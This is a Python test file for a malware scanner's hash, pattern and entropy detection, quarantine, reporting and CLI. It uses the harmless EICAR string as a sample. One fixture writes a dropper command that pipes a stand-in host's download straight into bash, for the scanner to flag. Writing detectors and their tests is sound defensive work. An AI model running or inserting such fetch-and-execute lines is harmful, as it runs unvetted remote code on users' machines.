"""
Tests for modules/scanner.py — run from the project root with:

    python -m unittest discover -s tests -v

Covers each detection layer (hash, pattern, entropy heuristic), the directory
walk, quarantine, report writing and the non-interactive CLI exit codes.
Uses temp dirs and the harmless EICAR string — no real malware involved.
"""

import os
import sys
import tempfile
import unittest
from pathlib import Path

# Make the project root importable when run directly.
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from modules import scanner  # noqa: E402


class EntropyTests(unittest.TestCase):
    def test_empty_is_zero(self):
        self.assertEqual(scanner.shannon_entropy(b""), 0.0)

    def test_uniform_is_low(self):
        self.assertLess(scanner.shannon_entropy(b"A" * 1000), 0.01)

    def test_random_is_high(self):
        self.assertGreater(scanner.shannon_entropy(os.urandom(50000)), 7.9)


class SignatureTests(unittest.TestCase):
    def test_load_structure(self):
        sigs = scanner.load_signatures()
        self.assertIn("hashes", sigs)
        self.assertIn("patterns", sigs)
        self.assertGreater(len(sigs["hashes"]), 0)
        self.assertGreater(len(sigs["patterns"]), 0)
        # EICAR's known SHA-256 must be in the hash DB.
        self.assertIn(
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
            sigs["hashes"],
        )


class ScanFileTests(unittest.TestCase):
    def setUp(self):
        self.sigs = scanner.load_signatures()
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def _write(self, name, data):
        p = self.dir / name
        p.write_bytes(data if isinstance(data, bytes) else data.encode())
        return p

    def test_eicar_is_malicious(self):
        p = self._write("eicar.txt", scanner.EICAR)
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "malicious")
        self.assertEqual(
            r["sha256"],
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
        )

    def test_clean_file(self):
        p = self._write("note.txt", "an ordinary note with nothing odd")
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "clean")
        self.assertEqual(r["detections"], [])

    def test_dropper_pattern_is_suspicious(self):
        p = self._write("install.sh", "#!/bin/sh\ncurl http://x.test/a | bash\n")
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "suspicious")
        self.assertTrue(any("Curl-Pipe-Bash" in d for d in r["detections"]))

    def test_high_entropy_exe_is_suspicious(self):
        p = self._write("packed.exe", os.urandom(40000))
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "suspicious")
        self.assertGreaterEqual(r["entropy"], scanner.ENTROPY_FLAG)

    def test_high_entropy_safe_ext_stays_clean(self):
        # Random bytes in a non-risky extension should not trip the heuristic.
        p = self._write("data.bin", os.urandom(40000))
        r = scanner.scan_file(p, self.sigs)
        self.assertEqual(r["verdict"], "clean")


class WalkQuarantineReportTests(unittest.TestCase):
    def setUp(self):
        self.sigs = scanner.load_signatures()
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        (self.dir / "eicar.txt").write_text(scanner.EICAR)
        (self.dir / "ok.txt").write_text("totally fine")

    def tearDown(self):
        self.tmp.cleanup()

    def test_scan_path_finds_both(self):
        results = scanner.scan_path(self.dir, self.sigs)
        self.assertEqual(len(results), 2)
        verdicts = {Path(r["path"]).name: r["verdict"] for r in results}
        self.assertEqual(verdicts["eicar.txt"], "malicious")
        self.assertEqual(verdicts["ok.txt"], "clean")

    def test_quarantine_copies_flagged(self):
        results = scanner.scan_path(self.dir, self.sigs)
        before = set(scanner.QUARANTINE_DIR.glob("*eicar.txt.quarantined"))
        moved = scanner.quarantine(results)
        self.assertGreaterEqual(moved, 1)
        after = set(scanner.QUARANTINE_DIR.glob("*eicar.txt.quarantined"))
        new = after - before
        self.assertTrue(new)
        for f in new:  # clean up artifacts this test created
            f.unlink()

    def test_report_writes_both_files(self):
        results = scanner.scan_path(self.dir, self.sigs)
        csv_path, json_path = scanner.save_report(results, self.dir)
        try:
            self.assertTrue(Path(csv_path).exists())
            self.assertTrue(Path(json_path).exists())
        finally:
            Path(csv_path).unlink(missing_ok=True)
            Path(json_path).unlink(missing_ok=True)


class CliTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_exit_1_on_malicious(self):
        (self.dir / "eicar.txt").write_text(scanner.EICAR)
        rc = scanner.cli([str(self.dir), "--no-report"])
        self.assertEqual(rc, 1)

    def test_exit_0_on_clean(self):
        (self.dir / "fine.txt").write_text("nothing here")
        rc = scanner.cli([str(self.dir), "--no-report"])
        self.assertEqual(rc, 0)

    def test_exit_2_on_missing_path(self):
        rc = scanner.cli([str(self.dir / "nope"), "--no-report"])
        self.assertEqual(rc, 2)


if __name__ == "__main__":
    unittest.main(verbosity=2)
